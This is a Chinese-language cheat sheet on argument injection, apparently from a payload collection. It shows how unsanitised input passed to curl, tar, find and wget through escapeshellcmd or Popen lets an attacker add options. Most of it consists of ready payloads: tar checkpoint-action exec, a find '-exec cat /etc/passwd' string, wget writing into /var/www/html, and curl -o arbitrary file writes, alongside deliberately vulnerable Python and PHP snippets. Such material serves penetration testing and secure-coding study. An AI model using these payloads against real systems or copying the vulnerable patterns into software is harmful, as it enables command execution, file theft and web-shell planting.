# Argument Injection - 参数注入

参数注入类似于命令注入，被污染的数据没有进行适当的清理/转义，而被传递到 shell 中执行。 

参数注入可能发生在不同的情况下，但只能将参数注入到命令中： 

- 不当的数据清理（正则表达式） 
- 将参数注入固定命令（PHP：escapeshellcmd，Python：Popen） 
- Bash 扩展（例如：*）

在以下示例中，python 脚本从命令行获取输入以生成 `curl` 命令：

```python
from shlex import quote,split
import sys
import subprocess

if __name__=="__main__":
    command = ['curl']
    command = command + split(sys.argv[1])
    print(command)
    r = subprocess.Popen(command)
```

攻击者可能会传递几个单词来对 `curl` 命令中的选项进行利用：

```python
python python_rce.py "https://www.google.fr -o test.py" 
```

通过打印命令，我们可以看到，所有参数都被拆分，允许注入一个参数，并将响应保存在任意文件中。

```
['curl', 'https://www.google.fr', '-o', 'test.py']
```

## Summary - 总结

  - [List of exposed commands - 命令列表](#list-of-exposed-commands---命令列表)
    - [CURL](#curl)
    - [TAR](#tar)
    - [FIND](#find)
    - [WGET](#wget)
  - [References](#references)

## List of exposed commands - 命令列表

### CURL

可以通过以下选项对 `curl`命令进行利用：

```
 -o, --output <file>        写入文件，而不是标准输出
 -O, --remote-name          写入文件，文件名为远程文件名
```

如果命令中已经有一个选项，则可以注入多个要下载的 URL 和几个输出选项。每个选项将依次影响每个 URL。

### TAR

对于 `tar` 命令，可以在不同的命令中注入任意参数。 

参数注入可以发生在 '''extract''' 命令中：

```
--to-command <command>
--checkpoint=1 --checkpoint-action=exec=<command>
-T <file> or --files-from <file>
```

或在 '''create''' 命令中:

```
-I=<program> or -I <program>
--use-compres-program=<program>
```

还有一些较短的选项，可以没有空格：

```
-T<file>
-I"/path/to/exec"
```

### FIND

在 /tmp目录下找一些文件：

```
$file = "some_file";
system("find /tmp -iname ".escapeshellcmd($file));
```

打印 /etc/passwd 内容：

```
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```

### WGET

漏洞代码示例：

```
system(escapeshellcmd('wget '.$url));
```

任意文件写入：

```
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```

## References

- [staaldraad - Etienne Stalmans, November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014](https://www.exploit-db.com/papers/33930)
- [TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek, Apr 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)